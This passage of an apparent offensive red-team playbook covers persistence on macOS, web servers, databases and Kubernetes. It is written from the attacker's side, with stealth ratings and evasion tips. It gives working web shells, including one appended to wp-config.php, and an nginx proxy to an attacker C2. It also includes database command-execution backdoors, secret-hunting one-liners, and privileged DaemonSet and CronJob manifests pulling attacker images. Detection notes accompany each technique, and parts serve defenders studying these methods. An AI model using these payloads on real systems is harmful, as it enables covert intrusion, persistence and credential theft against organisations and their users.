#   entitlements
# - Updater helper binaries running without hardened runtime

# DETECTION:
# - File integrity monitoring on .app bundles
# - Code signing validation (spctl --assess)
# - ES events for dylib loads
```

### 11.7 — Authorization Plugin (Root)

```
═══════════════════════════════════════════════════════════
AUTHORIZATION PLUGIN — loaded during login process (BTM-invisible)
STEALTH: MEDIUM-HIGH (BTM-invisible; rarely audited outside managed Mac
        fleets); signing requirement on current macOS limits unsigned use
═══════════════════════════════════════════════════════════
# Place plugin bundle in /Library/Security/SecurityAgentPlugins/
# Register: security authorizationdb write system.login.console mechanisms <plugin>
# NOTE: /etc/authorization replaced by security authorizationdb framework
# Plugin code executes as root during authentication flow

# CAVEAT: On modern macOS, plugin must be properly signed to load —
# unsigned plugins fail under SIP + hardened runtime enforcement
# unless SIP is disabled.

# DETECTION:
# - Plugin enumeration in /Library/Security/SecurityAgentPlugins/
# - authorizationdb state diff against baseline
# - File integrity monitoring on this path
```

### 11.8 — Periodic Scripts

```bash
# ═══════════════════════════════════════════════════════════
# PERIODIC SCRIPTS — BTM-invisible
# ═══════════════════════════════════════════════════════════
# /etc/periodic/daily, /etc/periodic/weekly, /etc/periodic/monthly
# Scripts here run on schedule via launchd-triggered periodic wrapper
# Less audited than cron; BTM-invisible
cat << 'EOF' > /etc/periodic/daily/999.health
#!/bin/sh
/Users/Shared/.config/agent &
EOF
chmod +x /etc/periodic/daily/999.health

# DETECTION: Directory listing, FIM on /etc/periodic/
# OPSEC: BTM-invisible, but FIM on /etc/ is common
```

### 11.9 — emond (DEPRECATED but still present)

```
═══════════════════════════════════════════════════════════
emond — Event Monitor Daemon (deprecated since 10.15)
═══════════════════════════════════════════════════════════
# Deprecated since macOS 10.15+ but still exists on hosts that haven't
# explicitly removed it. Rules in /etc/emond.d/rules/ — plist format.

# DETECTION: ls /etc/emond.d/rules/ (non-empty is suspicious on Ventura+)
# OPSEC: HIGH on legacy hosts; essentially absent on modern deployments
```

### 11.10 — Defender Stack Reference (macOS-Side)

```
═══════════════════════════════════════════════════════════
WHAT EACH DEFENDER PRODUCT SEES (macOS persistence-specific)
═══════════════════════════════════════════════════════════

ENDPOINT SECURITY FRAMEWORK (ESF) consumers:
  CrowdStrike Falcon for macOS
    Sees: All ES event types + file/network/process events; behavioral
    rules including BTM-event subscription.
  SentinelOne Singularity macOS
    Storyline causal-graph reconstruction; BTM event-based detection.
  Jamf Protect
    Apple-specialist EDR; deepest BTM/MDM integration; tight
    integration with Jamf Pro management.
  Sophos Intercept X for Mac
    Multi-platform vendor; ES-based + behavioral.
  Huntress macOS
    SOC-augmented; ES events surfaced to managed-detection team.

NATIVE APPLE SECURITY:
  XProtect
    Built-in signature detection; updated out-of-band via XProtect
    Remediator on Sonoma+. Detects known persistence patterns.
  Background Task Management daemon (BTM)
    System daemon enumerating LaunchAgent / LaunchDaemon / Login Item /
    SMAppService registrations; user notification on add; ES event
    emission.
  TCC (Transparency, Consent, Control)
    User-consent database; blocks persistence requiring TCC-protected
    access (Files, Camera, Mic, Accessibility, Full Disk Access).
  Gatekeeper + Notarization
    Blocks unsigned/unnotarized apps; quarantine bit triggers check.
  Launch Constraints (Ventura+) + Environment Constraints (Sonoma+)
    Per-binary execution rules; blocks dylib hijacks against constrained
    binaries.

PERSISTENCE-SPECIFIC TOOLS (defender-side):
  sfltool dumpbtm
    Apple-provided CLI; authoritative BTM inventory.
  BlockBlock / KnockKnock (Patrick Wardle / Objective-See)
    Persistence monitoring; what EDR vendors model their detection on.
  DumpBTM (Wardle)
    Programmatic BTM enumeration including bypass-resilient paths.
```

```
═══════════════════════════════════════════════════════════
SECTION 11 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Cross-ref → §6 Windows OPSEC reference
Cross-ref → §10 Linux OPSEC reference
Cross-ref → §12 web app persistence (browser extension parallel applies
            on macOS too)
NEVER → Drop LaunchAgent plist on Ventura+ without verifying BTM
        notification suppression strategy; user notification + ES event
        fires immediately
```

---

## 12 — WEB APPLICATION & MARKETPLACE PERSISTENCE

> **Typical chains through this section:** Web compromise → web shell as fast fallback → middleware/server module for stealth tier → DB persistence → JWT signing key theft for app-level token forgery → OAuth app + browser extension + IDE marketplace for cross-platform user persistence → subdomain takeover for infrastructure persistence.

### 12.1 — Web Shells — Advanced (T1505.003)

```bash
# ═══════════════════════════════════════════════════════════
# WEB SHELLS — OBFUSCATED + STEALTH PATTERNS
# MITRE ATT&CK: T1505.003 (Web Shell)
# STEALTH: MEDIUM (webshell scanners detect common patterns)
# SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update Maybe Reimage ✗
# ═══════════════════════════════════════════════════════════

# PHP — Base64-encoded command execution:
echo '<?php @eval(base64_decode($_POST["d"])); ?>' > /var/www/html/.health.php

# Variable function call (avoids static string match):
echo '<?php $f="sys"."tem"; if(isset($_GET["c"])){$f($_GET["c"]);} ?>' > /var/www/html/.health.php

# Embed in legitimate file (append to existing PHP — hardest to find):
echo '<?php if(isset($_REQUEST["health"])){system($_REQUEST["health"]);} ?>' >> /var/www/html/wp-config.php

# ASP.NET:
# <%@ Page Language="C#" %><%if(Request["c"]!=null){System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);}%>

# JSP:
# <%if(request.getParameter("c")!=null){Runtime.getRuntime().exec(request.getParameter("c"));}%>

# Node.js (Express middleware backdoor):
# app.use((req,res,next)=>{if(req.query.health){require('child_process').exec(req.query.health);} next();});

# OPSEC:
# - Match timestamps: touch -r /var/www/html/index.php /var/www/html/.health.php
# - Match ownership: chown www-data:www-data /var/www/html/.health.php

# DETECTION: FIM on webroot, web access logs, webshell scanners
# (Microsoft Defender for Endpoint includes web-shell signature for IIS)
```

### 12.2 — Middleware / Server Module Backdoors

```
═══════════════════════════════════════════════════════════
MIDDLEWARE / SERVER MODULE BACKDOORS — VERY HIGH STEALTH
STEALTH: VERY HIGH (runs inside web server process; no separate process)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗ Cred Rotation ✓
═══════════════════════════════════════════════════════════

# Apache module (persistent across restarts; loaded into Apache process):
# Compile custom Apache module (.so) intercepting requests
# cp mod_health.so /usr/lib/apache2/modules/
# echo "LoadModule health_module /usr/lib/apache2/modules/mod_health.so" \
#   > /etc/apache2/mods-enabled/health.load
# Module processes specific requests as backdoor; passes others normally

# Nginx — modify nginx.conf to proxy specific paths to attacker:
# location /.well-known/health { proxy_pass http://attacker-c2/; }
# Or: Lua module execution via OpenResty/Nginx Lua

# IIS — managed HTTP module:
# Install .NET module into IIS pipeline → processes all requests
# Hidden in web.config <modules> section

# DETECTION: Config file diffs, module inventory comparison to baseline
# OPSEC: VERY HIGH — runs inside web-server process
```

### 12.3 — Database Persistence

```sql
-- ═══════════════════════════════════════════════════════════
-- DATABASE PERSISTENCE — triggers, UDFs, jobs
-- STEALTH: MED-HIGH (database internals historically under-audited)
-- ═══════════════════════════════════════════════════════════

-- MySQL/MariaDB trigger:
CREATE TRIGGER health_check AFTER INSERT ON users FOR EACH ROW
  BEGIN ... (UDF call or sys_exec) END;

-- MySQL UDF (User Defined Function) — system command execution:
-- Compile lib_mysqludf_sys.so → place in plugin directory
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('/opt/.cache/session-mgr &');

-- PostgreSQL — PL/pgSQL function with COPY TO PROGRAM:
CREATE OR REPLACE FUNCTION health() RETURNS void AS $$
BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''/opt/.cache/session-mgr &'''; END;
$$ LANGUAGE plpgsql;

-- MSSQL — SQL Agent Job / xp_cmdshell:
EXEC msdb.dbo.sp_add_job @job_name='HealthCheck';
EXEC msdb.dbo.sp_add_jobstep @job_name='HealthCheck', @step_name='run',
  @command='C:\ProgramData\svc.exe', @subsystem='CmdExec';
EXEC msdb.dbo.sp_add_jobschedule @job_name='HealthCheck', @freq_type=4, @freq_interval=1;

-- DETECTION: DB audit logs, stored procedure/trigger inventory, DB-level
-- FIM, SQL Server audit for trigger/job creation, MySQL/PG audit plugins
-- OPSEC: MED-HIGH — DB internals historically under-audited but DAM
-- products + cloud database audit logs increasingly surface this
```

### 12.4 — JWT Signing Key Theft

```
═══════════════════════════════════════════════════════════
JWT SIGNING KEY THEFT — TOKEN FORGERY FOR ANY USER
MITRE ATT&CK: T1606.001 (Forge Web Credentials: Web Cookies)
STEALTH: VERY HIGH on network layer
SURVIVABILITY: Lasts until key rotated (often months/years)
═══════════════════════════════════════════════════════════

# Common locations:
# - Environment variables: printenv | grep -i jwt\|secret\|key\|token
# - Config files: grep -r "jwt\|secret_key\|signing" /etc/ /opt/ /var/www/
# - .env files: find / -name ".env" -exec grep -li "jwt\|secret" {} \;
# - Key management: AWS SSM Parameters, Azure Key Vault, HashiCorp Vault

# Once extracted: forge tokens offline; auth as any user
# Persistence: lasts until key rotated

# DETECTION:
# - Network-layer: invisible (tokens are cryptographically valid)
# - Server-layer: anomalous token issuance patterns (impossible travel,
#   new device fingerprint, unusual issuer jurisdiction, token claims
#   inconsistent with legitimate issuance system audit log)
# - Correlation: tokens presented at resource vs IdP audit log; gaps
#   indicate forgery

# OPSEC: VERY HIGH on network layer; detection requires server-side
# logging correlation most orgs do not perform
```

### 12.5 — OAuth Application Persistence

```
═══════════════════════════════════════════════════════════
OAUTH APP PERSISTENCE — refresh tokens survive password changes
MITRE ATT&CK: T1550.001 (Application Access Token), T1078.004
STEALTH: HIGH (blends with legitimate SaaS integrations)
SURVIVABILITY: Reboot N/A Passwd ✓ (with CAE caveat) Reimage N/A
              Cred Rotation ✓ (until app consent revoked)
═══════════════════════════════════════════════════════════
# Register OAuth app with broad permissions → maintain access via refresh
# tokens. Works across O365/Entra ID, Google Workspace, GitHub, Slack, etc.

# ★ CONTINUOUS ACCESS EVALUATION (CAE) CAVEAT:
# Entra ID with CAE can revoke delegated tokens on password change,
# account disable, or location change. CAE enabled by default for many
# M365 tenants on SharePoint, Exchange, Teams (~15min latency on
# critical events; extends token validity to 28hrs for CAE-aware apps).
# client_credentials flow (app-only) tokens are unaffected by user
# password changes since they use app's client secret, not user creds.
# Source: https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation

# Even if session revoked → app consent persists (must explicitly revoke)
# Must explicitly revoke app consent AND delete app registration to
# fully remove access

# O365/Entra ID:
# Register app → grant Mail.Read, Files.ReadWrite.All, User.Read.All
# Generate client secret → use client_credentials flow for access
# Or: consent phishing (user grants permissions to attacker app)

# DETECTION: App registration audit, consent grant review, Graph API logs
# OPSEC: HIGH stealth — blends with legitimate SaaS integrations
```

### 12.6 — Browser Extension Persistence (EXPANDED)

```
═══════════════════════════════════════════════════════════
BROWSER EXTENSION PERSISTENCE (CYBERHAVEN-ERA EXPANSION)
MITRE ATT&CK: T1176 (Browser Extensions)
STEALTH: HIGH (signed extension; passes Web Store review for low-tier)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗ Cred Rotation ✗
              (cookie API access bypasses App-Bound Encryption — extension
              has legitimate cookie-API call path)
CLEANUP COST: MEDIUM (uninstall + revoke Chrome account sync; if
              extension installed via Enterprise Policy, remove policy)
═══════════════════════════════════════════════════════════

WHY THIS IS A FIRST-CLASS PERSISTENCE TECHNIQUE IN 2026:
- Cookie API access via extension bypasses App-Bound Encryption (Chrome
  127+) — extensions have legitimate cookie-read API path
- Tab content read access = visibility into every SaaS session
- Network-request interception = manipulation of in-flight requests
- Message passing to attacker C2 — covert channel
- Extension auto-updates from Web Store = silent re-establishment of
  access if defender removes payload manually

DELIVERY VECTORS:
1. Direct phishing link to operator-uploaded extension on Chrome Web
   Store / Edge Add-ons / Firefox AMO. Web Store review catches obvious
   malicious extensions but mid-quality phishing tooling persists
   weeks-to-months.
2. Side-loaded extension via Chrome Enterprise policy (registry/policy
   write on host required — admin-tier persistence)
3. Compromised legitimate extension via maintainer OAuth account phish
   (Cyberhaven pattern; cascade observed Dec 2024)

CYBERHAVEN PRECEDENT (December 2024):
  Source: https://www.cyberhaven.com/blog/cyberhavens-chrome-extension-security-incident-and-what-were-doing-about-it
  - Compromise of legitimate Cyberhaven Chrome extension developer's
    Google account via OAuth phishing (Dec 24-26, 2024)
  - Pushed malicious update to existing extension
  - 400k+ Cyberhaven users affected
  - CASCADE: broader campaign hit 30+ extensions affecting 2.6M users
  - Pattern continues 2025-2026 with elevated defender attention

POST-CYBERHAVEN OPERATOR LANDSCAPE 2025-2026:
- Chrome Web Store mandated Two-Step Verification for developers Q2 2025
- Extension auto-update telemetry: Chrome Enterprise Reporting Connector
  flags new extension installs to enterprise admins (when configured)
- Extension manifest changes (new permissions, new host_permissions)
  require user re-consent and may not auto-apply silently
- Microsoft Defender for Cloud Apps "Suspicious browser extension"
  alert (Q1 2026)

INSTALLATION CAPABILITIES (post-install):
# manifest.json grants permissions to:
# - "cookies" — read/write cookies for any site (with host_permissions)
# - "tabs" — read tab URLs and titles
# - "<all_urls>" host permission — content-script injection on any site
# - "webRequest" / "webRequestBlocking" — intercept and modify requests
# - "scripting" — execute scripts in page context
# - "storage" — local storage (covert C2 state)
# - "alarms" — periodic timer (beacon)

# Common extension behaviors enabling persistence:
# - Cookie exfiltration to attacker domain
# - SaaS session-cookie replay (bypasses MFA via cookie)
# - In-flight request manipulation (inject JS, modify forms)
# - Silent token-refresh capture
# - Periodic heartbeat to attacker C2

DETECTION:
- Chrome Enterprise Reporting Connector — unmanaged extension install
  events
- Defender for Cloud Apps Cloud Discovery + Shadow IT extension monitoring
- Browser-side: Chrome Enhanced Safe Browsing flags some malicious
  extensions
- Behavioral: extension making cross-origin requests to non-vendor
  backend

DEFENSES:
- Chrome Enterprise extension allowlist (ExtensionInstallAllowlist GPO)
  — blocks all unlisted extensions
- Edge: SmartScreen Application Reputation for extension installs
- Firefox: enterprise policies for extension management
- Mandatory Web Store dev 2FA (post-Cyberhaven)
- Extension manifest review for excessive permissions

OPSEC: HIGH at install (legitimate Web Store URL, signed extension);
MEDIUM-LOW once extension behaviorally exfiltrates data. Allowlist
policy in mature enterprises kills the vector entirely.
```

### 12.7 — IDE Marketplace Extension Persistence (NEW — VS Code / JetBrains)

```
═══════════════════════════════════════════════════════════
IDE MARKETPLACE EXTENSION PERSISTENCE — DEVELOPER-TARGETED
MITRE ATT&CK: T1176 (Browser Extensions — adjacent), T1195.001
STEALTH: MEDIUM-HIGH (signed extension; passes marketplace review for
        low-tier payloads)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗ Cred Rotation ✗
CLEANUP COST: MEDIUM-HIGH (developer machines often have cloud / git /
              CI credentials = high-value persistence target)
═══════════════════════════════════════════════════════════

WHY DEVELOPER-TARGETED PERSISTENCE IS HIGH-VALUE:
- Developer machines typically hold:
  * GitHub / GitLab / Bitbucket Personal Access Tokens
  * Cloud CLI configurations (~/.aws, ~/.azure, ~/.config/gcloud)
  * Kubernetes kubeconfig files
  * Database connection strings + secrets in .env files
  * SSH keys to production infrastructure
  * Code-signing certificates (in some cases)
- IDE extension has access to entire project filesystem when opened
- Extensions auto-update from marketplace — silent re-establishment

VS CODE EXTENSION SURGE 2025 (Hunt.io research):
  Source: https://hunt.io/blog/malicious-vscode-extension-anivia-octorat-attack-chain
  - 105 malicious VS Code extensions detected first 10 months 2025
  - vs 27 in 2024 — 4× INCREASE post-Cyberhaven precedent
  - OctoRAT / Anivia loader chain (Nov 2025) — multi-stage attack
  - Microsoft Marketplace + open-vsx.org both targeted

VS CODE EXTENSION CAPABILITIES (post-install):
  - vscode.workspace.fs API — read/write any project file
  - vscode.commands.executeCommand — invoke any registered command
  - extension activation events — auto-execute on workspace open,
    on language detection, on specific file extension
  - VS Code child_process via Node.js — spawn arbitrary processes
  - Language Server Protocol manipulation
  - Debug adapter abuse (gdb / lldb / Python debugger spawn)

JETBRAINS PLUGIN EXTENSION:
  - JetBrains Marketplace plugins for IntelliJ family (IntelliJ IDEA,
    PyCharm, GoLand, WebStorm, etc.)
  - Java-based plugins with full IDE API access
  - Less documented compromise pattern but same risk surface

DELIVERY VECTORS:
1. Operator-uploaded extension impersonating popular tool
   ("ESLint Plus", "GitHub Copilot Helper", "Docker Compose Pro")
2. Compromised legitimate maintainer publishes malicious update
3. open-vsx.org (less-reviewed alternative VS Code marketplace)
4. Manual install of .vsix file via phishing or package
5. Workspace recommendations injection (.vscode/extensions.json)

INSTALLATION PERSISTENCE:
- Extensions persist across IDE restart by default
- Extensions activate based on activationEvents in package.json:
  * "onStartupFinished" — activate on IDE start
  * "onLanguage:python" — activate when Python file opened
  * "workspaceContains:*.json" — activate when workspace has JSON files
- Auto-update from marketplace if marketplace source still publishes

DETECTION:
- VS Code: code --list-extensions inventory (audit periodically)
- JetBrains: Plugin Manager UI inventory
- Endpoint visibility: VS Code child_process via node.exe / electron
  spawning unexpected processes
- Network: extension making cross-origin HTTP requests to non-marketplace
  hosts
- File system: .vscode/extensions/<id>/ contents diff vs marketplace
  published version
- Defender for Endpoint flags suspicious VS Code child processes

DEFENSES:
- Microsoft Defender for Endpoint Vulnerability Management surfaces
  installed extensions
- Group Policy / Intune VS Code extension allowlist (Q4 2024+ added)
- Pre-commit hooks blocking workspace recommendations injection
- Developer training on marketplace extension hygiene

OPSEC: MEDIUM-HIGH at install (signed extension); HIGH return on
investment given developer-machine credential-rich environment. Major
2025-2026 emerging vector per Hunt.io / Aqua Security research.
```

### 12.8 — Subdomain Takeover for Persistent Phishing Infrastructure

```
═══════════════════════════════════════════════════════════
SUBDOMAIN TAKEOVER FOR PERSISTENT PHISHING INFRASTRUCTURE
MITRE ATT&CK: T1583.002 (Acquire Infrastructure: DNS Server)
STEALTH: HIGH (target's own subdomain — bypasses URL reputation)
SURVIVABILITY: Reboot N/A Reimage N/A Cred Rotation ✓
              (until target audits dangling DNS — typically months)
CLEANUP COST: HIGH (target must audit ALL DNS records, claim back
              dangling resources)
═══════════════════════════════════════════════════════════
(Cross-ref initial access §7.8 for delivery / discovery)

DETAILED MECHANISM:
- Dangling DNS records (CNAME to deprovisioned cloud resource) enable
  attacker to claim resource and host arbitrary content
- Common candidates: *.s3.amazonaws.com, *.cloudfront.net,
  *.azurewebsites.net, *.heroku.com, *.github.io, *.statuspage.io
- Phishing on TARGET's own subdomain bypasses URL reputation entirely

PERSISTENCE VALUE:
- Survives target's IT infrastructure rotation entirely (DNS infrastructure
  typically untouched in incident response unless takeover discovered)
- Ongoing phishing infrastructure with TARGET's own brand reputation
- Cookie / session data harvested from victims who trust the URL because
  it IS the legitimate target domain

DISCOVERY (attacker workflow):
- Tools: subjack, Nuclei takeovers/, can-i-take-over-xyz, SubOver,
  HostileSubBruteforcer
- See active recon §1 + initial access §7.8 for command syntax

CLAIMING THE RESOURCE:
- For S3: aws s3 mb s3://<dangling-bucket-name> (correct region)
- For Heroku: heroku create <app-name>
- For Azure App Service: az webapp create --name <name>
- For GitHub Pages: create repo with gh-pages branch named
  <name>.github.io
- For Shopify: register store with dangling subdomain

POST-CLAIM HOSTING:
- Phishing pages on target.com subdomain (login.target.com,
  sso.target.com) — bypasses URL reputation
- DKIM / SPF inheritance for email IF MX dangling — bypasses email
  authentication
- Brand-monitoring services often miss target's OWN domains in monitoring
  scope

DETECTION:
- Subdomain takeover monitoring (HudsonRock, Detectify, Microsoft
  Defender External Attack Surface Management)
- DNS audit: regular CNAME-target validation
- CSPM tools (Wiz, Lacework, Orca) detect dangling DNS in cloud-resource
  inventory
```

### 12.9 — DNS Provider / Edge Function Persistence (G8 + G9)

```
═══════════════════════════════════════════════════════════
DNS PROVIDER ADMIN COMPROMISE / CDN EDGE FUNCTION PERSISTENCE
MITRE ATT&CK: T1583.002 (DNS), T1090.004 (Domain Fronting — adjacent)
STEALTH: HIGH    SURVIVABILITY: Survives all on-host remediation
═══════════════════════════════════════════════════════════

DNS PROVIDER ADMIN COMPROMISE:
  Compromise of Route 53 / NS1 / Cloudflare DNS / Azure DNS admin →
  modify NS records / add MX redirector / hijack subdomain resolution at
  the DNS layer.
  Survives ALL on-host remediation. Requires DNS provider admin
  credential (typically separate from main IdP).

  Persistence pattern:
  - Add wildcard CNAME for unused subdomain → attacker C2
  - Add MX backup record pointing to attacker SMTP → email interception
  - Add TXT verification record for attacker SaaS sign-up → tenant control

  DETECTION:
  - DNS provider audit logs (Route 53 CloudTrail, NS1 audit, Cloudflare
    audit log)
  - External DNS monitoring services flag NS / MX changes
  - Microsoft Defender External Attack Surface Management (DEASM) detects
    new attacker subdomains tied to target's DNS

CDN EDGE FUNCTION PERSISTENCE:
  Compromise of CDN/edge platform admin (Cloudflare, Vercel, Netlify,
  AWS CloudFront, Fastly) → deploy persistent edge function intercepting
  all traffic to target's CDN-hosted site.

  Capabilities:
  - Cloudflare Workers — JavaScript at edge; modify request/response;
    inject JS into served pages; cookie manipulation
  - Vercel / Netlify edge functions — same model
  - AWS CloudFront Lambda@Edge — Node.js at edge

  Persistence value:
  - Survives target's web-server remediation entirely
  - Edge function executes BEFORE request reaches origin — perfect for
    credential harvest by injecting fake auth form

  DETECTION:
  - CDN admin audit logs (Cloudflare audit, Vercel/Netlify deployment
    logs)
  - Content integrity monitoring on CDN-served pages
  - JavaScript code review of CDN deployments
```

```
═══════════════════════════════════════════════════════════
SECTION 12 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §14 cloud persistence (web app foothold → cloud expansion)
Cross-ref → Initial access §3.7 browser extension delivery
Cross-ref → Initial access §3.8 remote-tool implant
Cross-ref → §14 OAuth + Graph subscription persistence
NEVER → Use unmodified webshell pattern from public exploit kit;
        signatured by every webshell scanner
```

---

## 13 — CONTAINER & KUBERNETES PERSISTENCE

> **Typical chains through this section:** Pod compromise → token theft (short-lived on v1.24+) → manually-created long-lived Secret token → MutatingWebhook injects sidecar in every new pod → DaemonSet for node-level persistence → Helm chart compromise in internal registry → GitHub Actions self-hosted runner for cross-cluster persistence.

### 13.1 — Kubernetes CronJob

```yaml
# ═══════════════════════════════════════════════════════════
# K8s CRONJOB — scheduled job persistence
# MITRE ATT&CK: T1053.005 (Scheduled Task/Job)
# STEALTH: MEDIUM (kube-system namespace less scrutinized)
# SURVIVABILITY: Reboot ✓ (cluster-level) Cred Rotation ✓
# ═══════════════════════════════════════════════════════════
cat << 'EOF' | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: log-rotation
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: logrotate
            image: attacker-registry/health:latest
            command: ["/bin/sh", "-c", "/agent"]
          restartPolicy: OnFailure
          serviceAccountName: default
EOF

# DETECTION:
# - kubectl get cronjobs -A
# - K8s audit log: CronJob create events
# - Falco / Tetragon / Tracee runtime rules
# - CSPM (Wiz / Lacework / Orca) flags unusual images
```

### 13.2 — DaemonSet (Runs on Every Node)

```yaml
# ═══════════════════════════════════════════════════════════
# DAEMONSET — privileged container on every node
# STEALTH: MEDIUM    SURVIVABILITY: Reboot ✓ Cred Rotation ✓
# CLEANUP COST: HIGH (kill DaemonSet + audit every node)
# ═══════════════════════════════════════════════════════════
cat << 'EOF' | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-health-monitor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: node-health
  template:
    metadata:
      labels:
        app: node-health
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: monitor
        image: attacker-registry/health:latest
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
EOF

# DETECTION:
# - kubectl get ds -A
# - Privileged container audit (CSPM tools, OPA Gatekeeper, Kyverno)
# - Image allowlist (admission control)
# - K8s audit log: DaemonSet create with privileged: true
```

### 13.3 — Mutating Admission Webhook

```
═══════════════════════════════════════════════════════════
MUTATING ADMISSION WEBHOOK — INJECT SIDECAR INTO EVERY NEW POD
MITRE ATT&CK: T1543 (Create/Modify System Process — adjacent), T1610
STEALTH: HIGH (often missed in audit cycles focused on Pods/Deployments)
SURVIVABILITY: Reboot ✓ Cred Rotation ✓
CLEANUP COST: HIGH (find + delete webhook + audit all injected pods)
═══════════════════════════════════════════════════════════
# Register admission webhook → inject sidecar / modify every new pod
# Webhook intercepts pod creation → adds container or modifies spec
# Extremely stealthy — affects ALL future deployments automatically

# DEFENDER CONTROLS (modern K8s clusters increasingly enforce):
# - OPA Gatekeeper — policy-based admission control; can block creation
#   of MutatingWebhookConfiguration objects when policy denies
# - Kyverno — Kubernetes-native policy engine; same enforcement
# - RBAC: requires admission-controller-class privileges to register
#   webhook (cluster-admin tier or specific custom role)

# DETECTION:
# - kubectl get mutatingwebhookconfigurations
# - K8s audit log: MutatingWebhookConfiguration create/update events
# - OPA Gatekeeper / Kyverno audit logs flag non-allowlisted webhook
#   registrations
# - CSPM tools (Wiz, Lacework, Orca, Sysdig) inventory webhooks
# - CIS K8s benchmark compliance check 4.1.x

# OPSEC: HIGH against ad-hoc cluster monitoring (often misses webhooks);
# MEDIUM against mature cluster security (runtime policy engines + CIS
# benchmark monitoring inventory webhooks). Q1 2026 trend: Kyverno
# adoption rising → blast radius for new webhook persistence is shrinking.
```

### 13.4 — Service Account Token Theft

```bash
# ═══════════════════════════════════════════════════════════
# K8s SA TOKEN THEFT — TokenRequest API v1.24+ context
# MITRE ATT&CK: T1552.007 (Container API)
# STEALTH: HIGH (legitimate K8s API auth)
# ═══════════════════════════════════════════════════════════
# From pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# ★ IMPORTANT — Token lifetime depends on cluster version:
# Pre-v1.24: auto-generated Secret-based tokens were LONG-LIVED (no expiry)
# v1.24+ default (since 2022): tokens projected via TokenRequest API,
#   time-bound (~1 hour default), auto-rotated by kubelet at 80% TTL
#   or 24hrs. NOT useful for long-term persistence — expire quickly.
#   Source: https://kubernetes.io/docs/concepts/security/service-accounts/

# For PERSISTENT access on modern clusters, must:
# 1. Manually create long-lived Secret-based token:
kubectl create token <sa-name> --duration=8760h     # 1 year
# Or create Secret of type kubernetes.io/service-account-token (still works):
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: <sa-name>-token
  annotations:
    kubernetes.io/service-account.name: <sa-name>
type: kubernetes.io/service-account-token
EOF
# Token then in: kubectl get secret <sa-name>-token -o jsonpath='{.data.token}' | base64 -d

# 2. Create new ServiceAccount with manually-bound long-lived Secret
# 3. Extract kubeconfig or cluster CA + admin credentials

# Use externally:
kubectl --token=<TOKEN> --server=https://API_SERVER get pods

# DETECTION:
# - K8s audit logs: token use from external IPs, token age anomalies
# - LegacyServiceAccountTokenNoAutoGeneration default in v1.24+
# - Falco rule: K8s API access from unexpected IP space

# OPSEC: HIGH — but short-lived tokens on modern clusters reduce
# persistence window without manual long-lived Secret creation.
```

### 13.5 — Container Image Backdoor

```bash
# ═══════════════════════════════════════════════════════════
# CONTAINER IMAGE BACKDOOR — registry compromise
# MITRE ATT&CK: T1525 (Implant Internal Image)
# STEALTH: HIGH on registries without signature enforcement
# ═══════════════════════════════════════════════════════════
# Modify base image in registry → all future deployments include backdoor
docker pull registry.internal/app:latest
# (modify Dockerfile: add RUN line or ENTRYPOINT wrapper)
docker push registry.internal/app:latest

# Or poison CI/CD pipeline to inject during build

# DETECTION:
# - Image hash comparison
# - Image signing (cosign / notary / sigstore)
# - SBOM audit
# - Admission controllers enforcing signed images
# - Registry audit logs for push events to critical repos

# OPSEC: HIGH on registries without signature enforcement; LOWER on
# registries with cosign/notary verification at pull time.
```

### 13.6 — Helm Chart / OCI Registry Supply Chain (NEW)

```
═══════════════════════════════════════════════════════════
HELM CHART / OCI REGISTRY SUPPLY CHAIN PERSISTENCE
MITRE ATT&CK: T1195.002 (Compromise Software Supply Chain)
STEALTH: HIGH (legitimate registry; common deployment pattern)
SURVIVABILITY: Reboot ✓ Cred Rotation ✓ Reimage of cluster nodes ✗
              (re-deployed on next chart install/upgrade)
═══════════════════════════════════════════════════════════

CONTEXT:
- 9,000+ public Helm charts on Artifact Hub
- Helm-installed software typically deployed cluster-wide
- Compromise of chart maintainer or registry admin → silent backdoor
  injection into chart templates → deploys on every consumer's
  helm install / helm upgrade

OBSERVED 2024-2025 INCIDENTS:
- Chaos Mesh (K8s CVE-2025-59358) used Helm in supply-chain context
  to deploy control plane compromises in multi-layer campaigns
- No major Helm-EXCLUSIVE supply chain attack documented through 2025,
  but Helm remains attack vector risk per Microsoft Defender for Cloud
  warning May 2025 (default YAML injection risks)

ATTACK PATTERNS:
1. Chart Maintainer Account Compromise:
   - OAuth phishing of chart maintainer's GitHub / Artifact Hub account
   - Push malicious chart version
   - Consumers running helm upgrade pull poisoned version
2. Internal Helm Repository Compromise:
   - Internal ChartMuseum / Harbor / Artifactory Helm repo as primary
     persistence target
   - Modify cached chart version → silent backdoor on next deployment
3. OCI Registry Image Backdoor (extends §13.5):
   - Helm 3 supports OCI registries (registry.io/charts)
   - Compromise registry admin → modify Helm chart artifacts → next
     pull installs backdoored chart

INSTALLATION PATTERN (operator):
# Compromise internal Helm repo or chart maintainer
# Modify chart template to include malicious init container or sidecar
# Push to registry
# Consumer's next helm upgrade deploys backdoor cluster-wide

# Example malicious Helm chart values injection:
# values.yaml (poisoned):
#   sidecars:
#     - name: monitor
#       image: attacker-registry/health:latest
#       securityContext:
#         privileged: true
#       volumeMounts:
#         - name: host-root
#           mountPath: /host

DETECTION:
- Helm chart provenance verification (helm verify, sigstore for charts)
- Chart-version monitoring (alert on unexpected version changes)
- OPA Gatekeeper / Kyverno policies blocking privileged sidecars
- CSPM admission inspection of Helm-deployed resources
- Internal registry audit logs (push events to critical chart repos)

